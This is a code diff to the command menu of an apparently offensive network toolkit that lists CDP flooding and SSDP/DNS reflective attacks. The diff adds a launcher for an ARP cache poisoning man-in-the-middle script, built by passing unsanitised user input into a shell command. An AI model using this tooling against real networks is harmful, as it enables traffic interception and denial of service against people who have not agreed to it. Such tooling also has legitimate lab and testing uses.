@@ -37,7 +37,10 @@ cmdList = [
             'cdp_flood ',
             'ssdp_reflective ',
             'dns_reflective ',
+            'arp_cache_poisoning ',
             'test(',
+            'start ',
+            'stop ',
             'dos ',
             'flood ',
 	    'exit',
@@ -82,6 +85,7 @@ def help_menu():
     print(GREEN + " cdp_flood "+YELLOW+"<test(2)/dos> <interface>\t\t\t\t\t"+MAGENTA + "CDP flooding the switch with CDP packets" + RESET)
     print(GREEN + " ssdp_reflective "+YELLOW+"<test(2)/flood> <ssdp_srv_ip> <victim_ip> <interface>\t"+MAGENTA+ "SSDP Reflective Attack (ssdp: rootdevice)" + RESET)
     print(GREEN + " dns_reflective "+YELLOW+"<test(2)/flood> <dns_srv_ip> <victim_ip> <website.com> <interface>\t"+MAGENTA+ "DNS Reflective Attack" + RESET)
+    print(GREEN + " arp_cache_poisoning "+YELLOW+"<start/stop> <victim_ip> <gateway_ip> <interface>\t"+MAGENTA+ "MITM via ARP cache poisoning" + RESET)
     print("="*60)
     print(RED + " Don't be an asshole and only use the test(2) parameter." + RESET)
     print(RED + " Of course, don't forget that wireshark is your friend !" + RESET)
@@ -329,6 +333,29 @@ def execute(cmd_tokens):
 
         return True
 
+
+    ############## ARP CACHE POISONING: MITM
+    # 
+    if cmd_tokens[0] == 'arp_cache_poisoning':
+        if len(cmd_tokens) <= 5:
+        
+            
+            if len(cmd_tokens)!=4:
+                if cmd_tokens[4]:
+                    interface = cmd_tokens[4]
+                else:
+                    interface = "eth0"
+            else:
+                interface= "eth0"
+
+            cmd_line = TOOLS_PATH + "arp_cache_poisoning.py -s " + cmd_tokens[1] + " -v " + cmd_tokens[2] + " -r " + cmd_tokens[3] + " -I " + interface
+
+            Popen(cmd_line, shell=True)
+        else:
+            print(RED + "[-] arp_cache_poisoning <start/stop> <victim_ip> <gateway_ip> <interface>" + RESET)
+
+
+        return True
 
     ############## HELP
     if (cmd_tokens[0] == '?' or cmd_tokens[0]=='help'):
